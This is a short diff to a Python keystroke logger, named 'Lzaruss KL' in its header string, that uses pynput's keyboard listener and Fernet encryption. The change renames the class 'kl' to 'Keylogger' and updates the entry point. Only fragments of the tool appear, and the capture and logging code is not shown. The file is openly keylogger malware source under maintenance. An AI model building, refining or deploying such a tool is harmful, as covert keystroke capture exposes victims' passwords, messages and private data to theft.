@@ -1,7 +1,7 @@
 from pynput import keyboard
 from cryptography.fernet import Fernet
 
-class kl:
+class Keylogger:
     def __init__(self):
         self.head = 'Lzaruss KL:\n'
         self.log = ''
@@ -44,4 +44,4 @@ class kl:
         listener.start()
 
 if __name__ == '__main__':
-    kl().start()
+    Keylogger().start()
